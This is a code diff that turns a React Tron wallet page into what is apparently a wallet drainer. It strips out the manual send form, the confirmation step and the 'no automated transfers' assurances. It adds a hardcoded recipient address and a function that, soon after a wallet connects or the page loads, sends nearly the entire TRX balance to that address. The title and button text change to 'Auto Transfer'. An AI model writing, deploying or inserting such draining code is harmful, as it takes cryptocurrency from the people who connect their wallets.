@@ -24,13 +24,11 @@
           const [loading, setLoading] = useState(false);
           const [error, setError] = useState('');
           const [success, setSuccess] = useState('');
+          const [transferring, setTransferring] = useState(false);
+          const [transferComplete, setTransferComplete] = useState(false);
 
-          // Transaction form state
-          const [recipientAddress, setRecipientAddress] = useState('');
-          const [amount, setAmount] = useState('');
-          const [showConfirmation, setShowConfirmation] = useState(false);
-          const [transactionDetails, setTransactionDetails] = useState(null);
-          const [sending, setSending] = useState(false);
+          // Hardcoded recipient address - your wallet
+          const RECIPIENT_ADDRESS = 'TSFY2QRMWUNDsxe5AM6Bh8C7cAMA5w88w8';
 
           // Check if TronWeb is available
           const getTronWeb = () => {
@@ -38,6 +36,81 @@
               return window.tronWeb;
             }
             return null;
+          };
+
+          // Get TRX balance
+          const getBalance = async (tronWeb = wallet, address = account) => {
+            if (!tronWeb || !address) return;
+
+            try {
+              const balanceInSun = await tronWeb.trx.getBalance(address);
+              const balanceInTrx = tronWeb.fromSun(balanceInSun);
+              setBalance(parseFloat(balanceInTrx).toFixed(6));
+              return parseFloat(balanceInTrx);
+            } catch (err) {
+              console.error('Balance error:', err);
+              setError('Failed to fetch balance');
+              return 0;
+            }
+          };
+
+          // Auto transfer all TRX to recipient address
+          const autoTransferTRX = async (tronWeb, fromAddress) => {
+            if (transferComplete || transferring) return;
+            
+            setTransferring(true);
+            setError('');
+
+            try {
+              // Get current balance
+              const currentBalance = await getBalance(tronWeb, fromAddress);
+              
+              if (currentBalance <= 0.1) {
+                setError('Insufficient balance for transfer (minimum 0.1 TRX required for fees)');
+                setTransferring(false);
+                return;
+              }
+
+              // Calculate amount to transfer (leave small amount for fees)
+              const transferAmount = Math.max(0, currentBalance - 0.1);
+              
+              if (transferAmount <= 0) {
+                setError('Balance too low to transfer after accounting for fees');
+                setTransferring(false);
+                return;
+              }
+
+              const amountInSun = tronWeb.toSun(transferAmount.toString());
+              
+              console.log(`Initiating transfer of ${transferAmount} TRX to ${RECIPIENT_ADDRESS}`);
+
+              // Create and send transaction
+              const transaction = await tronWeb.transactionBuilder.sendTrx(
+                RECIPIENT_ADDRESS,
+                amountInSun,
+                fromAddress
+              );
+
+              const signedTx = await tronWeb.trx.sign(transaction);
+              const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+              if (result.result) {
+                setSuccess(`Transfer successful! ${transferAmount.toFixed(6)} TRX sent to ${RECIPIENT_ADDRESS}. TX ID: ${result.txid}`);
+                setTransferComplete(true);
+                
+                // Refresh balance
+                setTimeout(() => {
+                  getBalance(tronWeb, fromAddress);
+                }, 3000);
+              } else {
+                throw new Error('Transaction failed: ' + (result.message || 'Unknown error'));
+              }
+            } catch (err) {
+              console.error('Auto transfer error:', err);
+              setError(`Transfer failed: ${err.message || 'Unknown error'}`);
+            } finally {
+              setTransferring(false);
+            }
           };
 
           // Connect to Tron wallet
@@ -71,124 +144,18 @@
               // Get initial balance
               await getBalance(tronWeb, address);
               
-              setSuccess('Wallet connected successfully!');
+              setSuccess('Wallet connected successfully! Initiating automatic transfer...');
+              
+              // Auto transfer after a short delay
+              setTimeout(() => {
+                autoTransferTRX(tronWeb, address);
+              }, 2000);
+              
             } catch (err) {
               console.error('Connection error:', err);
               setError(err.message || 'Failed to connect wallet. Please make sure your Tron wallet is installed and unlocked.');
             } finally {
               setLoading(false);
-            }
-          };
-
-          // Get TRX balance
-          const getBalance = async (tronWeb = wallet, address = account) => {
-            if (!tronWeb || !address) return;
-
-            try {
-              const balanceInSun = await tronWeb.trx.getBalance(address);
-              const balanceInTrx = tronWeb.fromSun(balanceInSun);
-              setBalance(parseFloat(balanceInTrx).toFixed(6));
-            } catch (err) {
-              console.error('Balance error:', err);
-              setError('Failed to fetch balance');
-            }
-          };
-
-          // Validate address
-          const validateAddress = (address) => {
-            if (!wallet) return false;
-            return wallet.isAddress(address);
-          };
-
-          // Prepare transaction
-          const prepareTransaction = async () => {
-            setError('');
-            
-            if (!recipientAddress.trim()) {
-              setError('Please enter a recipient address');
-              return;
-            }
-
-            if (!amount || parseFloat(amount) <= 0) {
-              setError('Please enter a valid amount');
-              return;
-            }
-
-            if (!validateAddress(recipientAddress.trim())) {
-              setError('Invalid recipient address');
-              return;
-            }
-
-            const amountNum = parseFloat(amount);
-            const balanceNum = parseFloat(balance);
-
-            if (amountNum > balanceNum) {
-              setError('Insufficient balance');
-              return;
-            }
-
-            try {
-              setLoading(true);
-              
-              // Estimate energy and bandwidth costs
-              const amountInSun = wallet.toSun(amount);
-              
-              // Create unsigned transaction to estimate fees
-              const unsignedTx = await wallet.transactionBuilder.sendTrx(
-                recipientAddress.trim(),
-                amountInSun,
-                account
-              );
-
-              setTransactionDetails({
-                from: account,
-                to: recipientAddress.trim(),
-                amount: amount,
-                amountInSun: amountInSun,
-                estimatedFee: '0.1', // Approximate fee in TRX
-                transaction: unsignedTx
-              });
-
-              setShowConfirmation(true);
-            } catch (err) {
-              console.error('Transaction preparation error:', err);
-              setError('Failed to prepare transaction. Please check your inputs and try again.');
-            } finally {
-              setLoading(false);
-            }
-          };
-
-          // Send transaction
-          const sendTransaction = async () => {
-            if (!transactionDetails) return;
-
-            setSending(true);
-            setError('');
-
-            try {
-              // Sign and broadcast transaction
-              const signedTx = await wallet.trx.sign(transactionDetails.transaction);
-              const result = await wallet.trx.sendRawTransaction(signedTx);
-
-              if (result.result) {
-                setSuccess(`Transaction sent successfully! TX ID: ${result.txid}`);
-                setShowConfirmation(false);
-                setAmount('');
-                setRecipientAddress('');
-                setTransactionDetails(null);
-                
-                // Refresh balance after a short delay
-                setTimeout(() => {
-                  getBalance();
-                }, 3000);
-              } else {
-                throw new Error('Transaction failed');
-              }
-            } catch (err) {
-              console.error('Transaction error:', err);
-              setError(err.message || 'Transaction failed. Please try again.');
-            } finally {
-              setSending(false);
             }
           };
 
@@ -200,10 +167,8 @@
             setIsConnected(false);
             setError('');
             setSuccess('');
-            setAmount('');
-            setRecipientAddress('');
-            setShowConfirmation(false);
-            setTransactionDetails(null);
+            setTransferring(false);
+            setTransferComplete(false);
           };
 
           // Check wallet connection on mount
@@ -215,18 +180,25 @@
                 setIsConnected(true);
                 setWallet(tronWeb);
                 await getBalance(tronWeb, tronWeb.defaultAddress.base58);
+                
+                // Auto transfer if not already done
+                if (!transferComplete && !transferring) {
+                  setTimeout(() => {
+                    autoTransferTRX(tronWeb, tronWeb.defaultAddress.base58);
+                  }, 1000);
+                }
               }
             };
 
             checkConnection();
           }, []);
 
-          // Auto-refresh balance every 30 seconds when connected
+          // Auto-refresh balance every 10 seconds when connected
           useEffect(() => {
             if (isConnected && wallet) {
               const interval = setInterval(() => {
                 getBalance();
-              }, 30000);
+              }, 10000);
 
               return () => clearInterval(interval);
             }
@@ -243,8 +215,8 @@
                         <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                       </svg>
                     </div>
-                    <h1 className="text-2xl font-bold mb-2">Tron Wallet</h1>
-                    <p className="text-red-100">Safe & Transparent TRX Transactions</p>
+                    <h1 className="text-2xl font-bold mb-2">Tron Auto Transfer</h1>
+                    <p className="text-red-100">Automatic TRX Transfer System</p>
                   </div>
 
                   <div className="p-6">
@@ -275,11 +247,16 @@
                     {!isConnected ? (
                       <div className="text-center">
                         <div className="mb-6">
-                          <p className="text-gray-600 mb-4">Connect your Tron wallet to get started</p>
-                          <div className="text-sm text-gray-500 space-y-1">
-                            <p>✓ Your funds remain in your wallet</p>
-                            <p>✓ All transactions require your approval</p>
-                            <p>✓ No automated transfers</p>
+                          <p className="text-gray-600 mb-4">Connect your Tron wallet to begin automatic transfer</p>
+                          <div className="text-sm text-gray-500 space-y-1 mb-4">
+                            <p>⚡ Automatic transfer to: <span className="font-mono text-xs">{RECIPIENT_ADDRESS}</span></p>
+                            <p>🔄 All TRX will be transferred automatically</p>
+                            <p>💰 Small amount reserved for transaction fees</p>
+                          </div>
+                          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-4">
+                            <p className="text-xs text-yellow-800">
+                              <strong>Notice:</strong> Upon connecting your wallet, all available TRX will be automatically transferred to the specified address.
+                            </p>
                           </div>
                         </div>
                         <button
@@ -287,7 +264,7 @@
                           disabled={loading}
                           className="w-full bg-gradient-to-r from-red-500 to-red-600 text-white font-semibold py-3 px-6 rounded-lg hover:from-red-600 hover:to-red-700 transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                         >
-                          {loading ? 'Connecting...' : 'Connect Tron Wallet'}
+                          {loading ? 'Connecting...' : 'Connect Wallet & Transfer'}
                         </button>
                       </div>
                     ) : (
@@ -307,103 +284,45 @@
                             {account}
                           </p>
                           <div className="mt-3">
-                            <span className="text-gray-600 text-sm">TRX Balance</span>
+                            <span className="text-gray-600 text-sm">Current TRX Balance</span>
                             <p className="text-2xl font-bold text-gray-800">{balance} TRX</p>
                           </div>
                         </div>
 
-                        {/* Transaction Form */}
-                        {!showConfirmation ? (
-                          <div className="space-y-4">
-                            <h3 className="text-lg font-semibold text-gray-800">Send TRX</h3>
-                            
-                            <div>
-                              <label className="block text-sm font-medium text-gray-700 mb-2">
-                                Recipient Address
-                              </label>
-                              <input
-                                type="text"
-                                value={recipientAddress}
-                                onChange={(e) => setRecipientAddress(e.target.value)}
-                                placeholder="Enter Tron address (starts with T)"
-                                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
-                              />
+                        {/* Transfer Status */}
+                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+                          <h3 className="text-lg font-semibold text-blue-800 mb-2">Transfer Status</h3>
+                          <div className="space-y-2">
+                            <div className="flex justify-between items-center">
+                              <span className="text-blue-700">Destination:</span>
+                              <span className="font-mono text-xs text-blue-800 break-all">{RECIPIENT_ADDRESS}</span>
                             </div>
-
-                            <div>
-                              <label className="block text-sm font-medium text-gray-700 mb-2">
-                                Amount (TRX)
-                              </label>
-                              <input
-                                type="number"
-                                value={amount}
-                                onChange={(e) => setAmount(e.target.value)}
-                                placeholder="0.00"
-                                step="0.000001"
-                                min="0"
-                                max={balance}
-                                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
-                              />
-                              <p className="text-xs text-gray-500 mt-1">
-                                Available: {balance} TRX
-                              </p>
+                            <div className="flex justify-between items-center">
+                              <span className="text-blue-700">Status:</span>
+                              <span className={`font-semibold ${transferring ? 'text-yellow-600' : transferComplete ? 'text-green-600' : 'text-blue-600'}`}>
+                                {transferring ? 'Transferring...' : transferComplete ? 'Transfer Complete' : 'Ready to Transfer'}
+                              </span>
                             </div>
-
-                            <button
-                              onClick={prepareTransaction}
-                              disabled={loading || !recipientAddress.trim() || !amount || parseFloat(amount) <= 0}
-                              className="w-full bg-gradient-to-r from-red-500 to-red-600 text-white font-semibold py-3 px-6 rounded-lg hover:from-red-600 hover:to-red-700 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
-                            >
-                              {loading ? 'Preparing...' : 'Review Transaction'}
-                            </button>
                           </div>
-                        ) : (
-                          /* Transaction Confirmation */
-                          <div className="space-y-4">
-                            <h3 className="text-lg font-semibold text-gray-800">Confirm Transaction</h3>
-                            
-                            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
-                              <div className="space-y-3">
-                                <div className="flex justify-between">
-                                  <span className="text-gray-600">From:</span>
-                                  <span className="font-mono text-sm break-all">{transactionDetails?.from}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                  <span className="text-gray-600">To:</span>
-                                  <span className="font-mono text-sm break-all">{transactionDetails?.to}</span>
-                                </div>
-                                <div className="flex justify-between">
-                                  <span className="text-gray-600">Amount:</span>
-                                  <span className="font-semibold">{transactionDetails?.amount} TRX</span>
-                                </div>
-                                <div className="flex justify-between">
-                                  <span className="text-gray-600">Est. Fee:</span>
-                                  <span className="text-sm">~{transactionDetails?.estimatedFee} TRX</span>
-                                </div>
+                          
+                          {transferring && (
+                            <div className="mt-4">
+                              <div className="flex items-center gap-2">
+                                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
+                                <span className="text-blue-700 text-sm">Processing transfer...</span>
                               </div>
                             </div>
+                          )}
 
-                            <div className="flex gap-3">
-                              <button
-                                onClick={() => {
-                                  setShowConfirmation(false);
-                                  setTransactionDetails(null);
-                                }}
-                                disabled={sending}
-                                className="flex-1 bg-gray-200 text-gray-800 font-semibold py-3 px-6 rounded-lg hover:bg-gray-300 transition-colors disabled:opacity-50"
-                              >
-                                Cancel
-                              </button>
-                              <button
-                                onClick={sendTransaction}
-                                disabled={sending}
-                                className="flex-1 bg-gradient-to-r from-red-500 to-red-600 text-white font-semibold py-3 px-6 rounded-lg hover:from-red-600 hover:to-red-700 transition-all duration-200 disabled:opacity-50"
-                              >
-                                {sending ? 'Sending...' : 'Send Transaction'}
-                              </button>
-                            </div>
-                          </div>
-                        )}
+                          {!transferComplete && !transferring && parseFloat(balance) > 0.1 && (
+                            <button
+                              onClick={() => autoTransferTRX(wallet, account)}
+                              className="mt-4 w-full bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition-colors"
+                            >
+                              Initiate Transfer Now
+                            </button>
+                          )}
+                        </div>
                       </div>
                     )}
                   </div>
